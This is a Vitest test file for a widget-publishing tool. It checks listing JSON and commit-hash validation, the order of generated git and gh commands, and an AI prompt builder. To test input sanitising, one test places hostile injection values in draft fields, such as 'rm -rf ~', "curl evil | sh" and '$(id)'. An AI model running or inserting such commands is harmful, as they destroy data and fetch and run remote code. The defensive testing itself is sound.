import { describe, expect, it } from 'vitest';
import { listing } from '../../src/lib/make/validators.generated.js';
import { idOf, repoOf } from '../../src/lib/make/draft';
import {
  COMMIT_PLACEHOLDER,
  aiPrompt,
  commitOk,
  listingOf,
  listingText,
  terminalSteps,
  tidyCommit
} from '../../src/lib/make/publish';
import { draftOf } from './make.helpers';

const HASH = 'ab12'.repeat(10);

describe('listing', () => {
  it('has the placeholder until a real hash is pasted, then validates', () => {
    const d = draftOf('system-monitor');
    expect(listingOf(d).commit).toBe(COMMIT_PLACEHOLDER);
    expect(listing(listingOf(d))).toBe(false);
    const l = listingOf(d, `  ${HASH.toUpperCase()}\n`);
    expect(l.commit).toBe(HASH);
    expect(listing(l)).toBe(true);
    expect(l).toMatchObject({
      id: idOf(d),
      repo: `https://github.com/Someone/${repoOf(d)}`,
      status: 'planned',
      categories: ['system']
    });
    expect(JSON.parse(listingText(d, HASH))).toEqual(l);
  });
  it('accepts only 40 hex characters', () => {
    for (const bad of ['', 'abc', HASH.slice(1), HASH + 'a', 'g'.repeat(40), 'a b'.padEnd(40, 'a')])
      expect(commitOk(bad), bad).toBe(false);
    expect(commitOk(HASH)).toBe(true);
    expect(tidyCommit(' AB ')).toBe('ab');
  });
});

describe('commands', () => {
  // Everything but the listing JSON, which sits inside a quoted heredoc (<<'EOF'): there it is data.
  const outsideHeredoc = (lines: string[]) => {
    const a = lines.findIndex((l) => l.includes("<<'EOF'"));
    const b = lines.indexOf('EOF');
    return lines.filter((_, i) => i <= a || i >= b);
  };
  it('contain only validated values, even when the name is hostile', () => {
    const d = draftOf('clock', {
      name: '"; rm -rf ~; echo `id` $(id) \'',
      description: "x'; curl evil | sh #",
      holder: '$(id)'
    });
    const text = outsideHeredoc(terminalSteps(d, 2026).flatMap((s) => s.lines)).join('\n');
    expect(text).not.toContain('rm -rf');
    expect(text).not.toContain('curl evil');
    expect(text).not.toContain('`');
    expect(text).not.toContain('$(id)');
    expect(text).toContain(
      'gh repo create Someone/omarchy-widget-rm-rf-echo-id-id --public --source . --push'
    );
  });
  it('are the commands the brief names, in order', () => {
    const d = draftOf('battery', { commit: HASH });
    const lines = terminalSteps(d, 2026).flatMap((s) => s.lines);
    const i = (p: string) => lines.findIndex((l) => l.startsWith(p));
    expect(
      i('gh repo create Someone/omarchy-widget-night-clock --public --source . --push')
    ).toBeGreaterThan(-1);
    expect(i('git commit')).toBeLessThan(i('gh repo create'));
    expect(i('gh repo create')).toBeLessThan(i('git rev-parse HEAD'));
    expect(i('git rev-parse HEAD')).toBeLessThan(i('gh repo fork'));
    expect(lines).toContain(`cat > registry/widgets/${idOf(d)}.json <<'EOF'`);
    expect(lines.join('\n')).toContain(`"commit": "${HASH}"`);
    expect(lines.some((l) => l.includes('--base develop'))).toBe(true);
    for (const l of outsideHeredoc(lines))
      expect(l.replace('$(gh auth token)', ''), l).not.toMatch(/[`;]|\$\(|\|/);
  });
  it('fetch the official text for a long license', () => {
    const lines = terminalSteps(draftOf('blank', { license: 'AGPL-3.0' }), 2026).flatMap(
      (s) => s.lines
    );
    expect(lines).toContain('curl -fsSL https://www.gnu.org/licenses/agpl-3.0.txt -o LICENSE');
  });
});

describe('ai prompt', () => {
  it('uses the idea and the username, or clear placeholders', () => {
    const p = aiPrompt(draftOf('blank'), 'https://example.com');
    expect(p).toContain('A clock for the dark.');
    expect(p).toContain('Someone');
    expect(p).toContain('https://example.com/skills/<name>/SKILL.md');
    expect(aiPrompt(draftOf('blank', { description: '', user: '' }), 'https://x.y')).toContain(
      '<describe your widget'
    );
  });
});
